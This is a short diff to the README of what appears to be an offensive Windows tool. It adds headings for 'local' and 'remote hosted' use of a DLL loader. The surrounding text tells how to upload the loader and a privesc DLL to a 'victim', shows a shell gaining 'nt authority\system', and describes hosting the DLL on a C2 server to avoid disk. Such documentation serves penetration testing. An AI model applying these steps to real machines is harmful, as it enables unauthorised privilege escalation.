@@ -23,7 +23,11 @@ Compile to EXE:
 $ x86_64-w64-mingw32-gcc remote_dll_loader.c -o remote_dll_loader.exe -lwininet
 ```
 
-You can also just grab the pre-compiled binary. From there you can uplaod the binary to the victim, for example using SMBMap. While you're at it upload the privesc.dll as well.
+You can also just grab the pre-compiled binary. 
+
+#### Local Hosted
+
+From there you can uplaod the binary to the victim, for example using SMBMap. While you're at it upload the privesc.dll as well.
 
 ```
 C:\Users\shawnevans>whoami
@@ -55,6 +59,9 @@ C:\Windows\system32>whoami
 nt authority\system
 
 C:\Windows\system32>
+
+#### Remote Hosted
+
 ```
 The scenario below demonstrates how privesc.dll can be hosted on a C2 server. This way we never touch disk with the malicious bits. First we fire up a simple python server to host the DLL.
 
